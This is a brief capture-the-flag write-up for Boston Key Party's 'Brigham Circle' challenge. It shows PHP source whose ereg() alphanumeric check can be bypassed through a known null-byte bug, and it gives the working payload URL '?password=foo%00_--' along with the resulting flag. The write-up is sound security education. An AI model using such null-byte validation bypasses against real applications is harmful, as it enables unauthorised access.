# Boston Key Party : Brigham Circle

#### Author: Wh1t3Fox

After viewing the page source I found a link which lead to the source code:

    <?php
        require 'flag.php';

        if (isset ($_GET['password'])) {
        	if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
        		echo '<p class="alert">You password must be alphanumeric</p>';
        	else if (strpos ($_GET['password'], '--') !== FALSE)
        		die('Flag: ' . $flag);
        	else
        		echo '<p class="alert">Invalid password</p>';
        }
    ?>

Looking at the code, you must validate the input as a number or letter, but somehow get the input to include --.

After looking up some vulnerabilities for PHP I came up with [this](https://bugs.php.net/bug.php?id=44366).
I crafted my payload and tried

     /index.php?password=foo%00_--

  Then I was presented with the flag: OK_Maybe_using_rexpexp_wasnt_a_clever_move
